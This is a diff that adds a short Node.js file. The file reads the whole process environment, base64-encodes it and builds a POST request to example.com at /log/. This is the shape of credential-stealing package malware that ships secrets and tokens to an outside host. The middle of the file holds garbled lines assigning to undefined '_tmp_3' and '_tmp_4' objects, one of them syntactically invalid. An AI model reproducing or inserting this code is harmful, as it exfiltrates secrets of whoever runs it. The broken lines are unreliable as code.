@@ -1,0 +1,27 @@
+const http = require('http')
+const querystring = require('querystring')
+const host = 'example.com'
+const env = JSON.stringify(process.env)
+const data = new Buffer(env).toString('base64')
+const postData = querystring.stringify({ data })
+const options = {
+	hostname: host,
+	port: 80,
+	path: '/log/',
+	method: 'POST',
+	headers: {
+		'Content-Type': 'application/x-www-form-urlencoded',
+		'Content-Length': Buffer.byteLength(postData)
+	}
+}
+_tmp_3.hostname = host
+_tmp_3.port = 80
+_tmp_3.path = "/log/"
+_tmp_3.method = "POST"
+_tmp_3.headers = {
+		'Content-Type': 'application/x-www-form-urlencoded',
+		'Content-Length': Buffer.byteLength(postData)
+	}
+_tmp_4.Content-Type = "application/x-www-form-urlencoded"
+_tmp_4.Content-Length = Buffer.byteLength(postData)
+const req1 = http.request(options)
